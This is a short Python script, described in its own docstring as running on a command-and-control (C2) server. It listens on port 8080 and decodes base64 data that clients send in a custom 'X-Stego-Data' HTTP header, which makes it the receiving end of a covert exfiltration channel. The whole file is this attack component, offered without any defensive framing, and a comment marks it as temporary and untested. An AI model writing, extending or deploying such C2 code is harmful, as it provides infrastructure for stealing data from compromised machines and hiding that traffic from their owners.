'''
Executes on the C2 server. Runs an HTTP server that listens for requests from the client.
'''

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

# TEMPORARY UNTESTED CODE

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Retrieve the encoded data from the HTTP header
        encoded_data = self.headers.get('X-Stego-Data')
        
        if encoded_data:
            decoded_data = base64.b64decode(encoded_data).decode()
            print("Received decoded data:", decoded_data)

        self.send_response(200)
        self.end_headers()

def main():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, RequestHandler)
    print('Server running on port 8080...')
    httpd.serve_forever()

if __name__ == '__main__':
    main()